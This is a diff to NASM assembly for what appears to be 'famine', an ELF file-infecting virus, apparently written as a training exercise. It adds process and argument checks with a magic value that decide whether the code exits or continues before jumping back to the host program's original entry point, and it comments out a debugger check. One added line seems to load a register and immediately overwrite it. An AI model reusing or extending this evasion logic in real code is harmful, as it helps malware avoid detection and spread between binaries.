@@ -19,6 +19,7 @@ section .text
 	global _o_entry
 	global _force_exit
 	global _jmp_to_o_entry
+	global _verif
 ;	extern _decrypt
 ;	extern _end_decrypt
 ;	extern _treat_file
@@ -58,15 +59,47 @@ _start:
 	push	r13		; +88
 	push	r14		; +96
 	push	r15		; +104
+	mov QWORD [rsp + 104], 0
 
-	call _checkdbg
-	cmp rax, 0
-	jne _verify_o_entry
+;_check_debugueur:
+;	call _checkdbg
+;	cmp rax, 0
+;	jne _check_alternate_start
+;	add QWORD [rsp + 104], 0x1
+;	cmp rax, 0
+;	jne _verify_o_entry
 
+_check_processus:
 	call _checkproc
 	cmp rax, 0
-	jne _verify_o_entry
+	jne _check_alternate_start
+	add QWORD [rsp + 104], 0x10
+;	cmp QWORD [rsp + 104], 0x11
+	jmp _check_famine_binary
 
+_check_alternate_start:
+	cmp QWORD [rsp + 136], 3
+	jne _test_reg
+	mov rdi, QWORD [rsp + 152]
+	lea r10, [rel _verif]
+	mov r10, QWORD [r10]
+	cmp QWORD [rdi], r10
+	je _force_exit
+_test_reg:
+	cmp QWORD [rsp + 64], 3
+	jne _verify_o_entry
+	mov rdi, QWORD [rsp + 72]
+	mov rdi, QWORD [rsi + 8]
+	lea r10, [rel _verif]
+	mov r10, QWORD [r10]
+	cmp QWORD [rdi], r10
+	je _force_exit
+	jmp _verify_o_entry
+
+;	cmp rax, 0
+;	jne _verify_o_entry
+
+_check_famine_binary:
 	;; If _o_entry label equals zero, we are into ./famine so we look for eventual arguments
 	lea		rax, [rel _o_entry]
 	cmp		QWORD [rax], 0
@@ -213,5 +246,9 @@ _jmp_to_o_entry:
 
 	;; Jump to old entry
 	jmp		[rax]
+
+; Here is our verif code
+_verif:
+	dq 0x1122334455667788
 
 %undef FAMINE_S
